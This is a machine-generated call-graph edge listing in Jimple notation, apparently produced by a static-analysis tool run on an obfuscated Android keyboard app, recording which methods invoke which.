VIRTUAL edge: virtualinvoke $r0.<java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
SPECIAL edge: specialinvoke $r0.<lak: void <init>(byte[])>(null) in <lsu: void <clinit>()> ==> <lak: void <init>(byte[])>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ing: void <init>(java.lang.String,iec)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r11 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r7, $r8) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("] was already created.") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Multiple entries with same key: ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lmb: void <init>()>() in <lme: lmb g()> ==> <lmb: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnp: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
SPECIAL edge: specialinvoke $r6.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_TRENDING_METADATA", 6, 6) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<lvs: void <init>(java.lang.String,int)>("LONG", 2) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getValue()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r4, $i0, $r9) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r5.<lqk: void <init>(java.lang.Object[],int)>($r6, 3) in <ivw: void <clinit>()> ==> <lqk: void <init>(java.lang.Object[],int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lje: boolean hasNext()>() in <lje: java.lang.Object next()> ==> <lje: boolean hasNext()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/io/InputStream;", r0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqs: lsa l()> ==> <lkq: lsb B()>
STATIC edge: $i1 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkg: void g(int)> ==> <lkg: int a(int,int)>
STATIC edge: $i0 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljd: int f(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
STATIC edge: $l0 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean z(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i2, 3) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("StickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: $r9 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsn: boolean b(lsr)>($r3) in <lsn: boolean ac()> ==> <lsd: boolean b(lsr)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r0, $r4) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>($r5, $r0, $i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<java.lang.Class: java.lang.String getName()>() in <ojg: void h(java.lang.Throwable)> ==> <java.lang.Class: java.lang.String getName()>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lsz: boolean equals(java.lang.Object)>($r14) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $l1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(3) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r22 = staticinvoke <bel: java.io.InputStream a(java.nio.ByteBuffer)>($r21) in <hbw: java.lang.Object a(java.lang.Object)> ==> <bel: java.io.InputStream a(java.nio.ByteBuffer)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r2) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: $i0 = specialinvoke $r2.<lvr: int b()>() in <lvr: void <init>(lvr,lvr)> ==> <lvr: int b()>
SPECIAL edge: specialinvoke $r6.<java.util.NoSuchElementException: void <init>()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqn: void <init>(lkx,java.lang.Object[],int,int)> ==> <lma: void <init>()>
STATIC edge: $r1 = staticinvoke <lme: lma l(java.util.Comparator)>(null) in <lme: void <init>(lkx,int)> ==> <lme: lma l(java.util.Comparator)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i0, $r1, $r2, $r3) in <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r2) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljf: java.lang.Object p()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
VIRTUAL edge: $r12 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(9) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int b(java.lang.Object[],int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>($r0, $r2) in <iye: void D(boolean,java.lang.String,int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" cannot be negative but was: ") in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lid: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<idq: void <init>(java.lang.String,mag)>($r0, $r1) in <idq: idq a(java.lang.String,mag)> ==> <idq: void <init>(java.lang.String,mag)>
CLINIT edge: staticinvoke <java.util.concurrent.TimeUnit: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.concurrent.TimeUnit: void <clinit>()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
VIRTUAL edge: $r8 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r6, "", $r7, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r4 = staticinvoke <kes: java.lang.String k(nfe)>($r27) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void l(int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqr: lsa l()> ==> <lma: lkq k()>
VIRTUAL edge: virtualinvoke $r3.<lli: void c(java.util.Map$Entry)>($r6) in <hbv: void j()> ==> <lli: void c(java.util.Map$Entry)>
SPECIAL edge: specialinvoke r0.<android.app.Application: void <init>()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()> ==> <android.app.Application: void <init>()>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r0) in <ojg: void v(java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
VIRTUAL edge: virtualinvoke $r14.<lkl: void h(java.lang.Object)>($r15) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: void h(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsh: lse h(java.util.logging.Level)>($r2) in <lsh: lsw a(java.util.logging.Level)> ==> <lsh: lse h(java.util.logging.Level)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r2.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r0, $r1, 0, 0) in <lsz: lsz c(java.lang.String,java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.ArrayList: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("tags", $r1, 0) in <lsk: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: $i0 = specialinvoke r0.<ljf: int n()>() in <ljf: java.util.Set f()> ==> <ljf: int n()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i5) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: int hashCode()>
CLINIT edge: staticinvoke <lvs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvs: void <clinit>()>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $r0 = staticinvoke <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>($r1) in <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)> ==> <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
STATIC edge: $i1 = staticinvoke <ql: int a(int[],int,int)>($r1, $i2, 0) in <qj: int j()> ==> <ql: int a(int[],int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r2) in <ljd: int f(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(6) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<ltr: void <init>()>() in <ltr: void <clinit>()> ==> <ltr: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "array") in <ql: int a(int[],int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(2) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segments", class "[Lj$/util/concurrent/o;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: $r3 = specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int z(int,int,int,int)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r28.<mag: void <init>(java.lang.String,int,int)>("TENOR_STICKER_SEARCH_METADATA", 28, 28) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>(4, $i0) in <izw: int ak(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $r3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>($r3, $r4) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>
STATIC edge: $r10 = staticinvoke <lum: lvt k()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lum: lvt k()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r3.<lvs: void <init>(java.lang.String,int)>("DOUBLE", 3) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke r0.<hbv: boolean o()>() in <hbv: void k(java.lang.Object,boolean)> ==> <hbv: boolean o()>
SPECIAL edge: specialinvoke $r1.<java.util.NoSuchElementException: void <init>()>() in <lnc: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r7) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lkf: void <init>()> ==> <lkx: void <init>()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "level") in <lsn: void <init>(java.util.logging.Level)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" component is already registered with a different value.") in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)> ==> <java.lang.Class: java.lang.String getName()>
STATIC edge: $i6 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>($r1, $r2, $r3) in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>
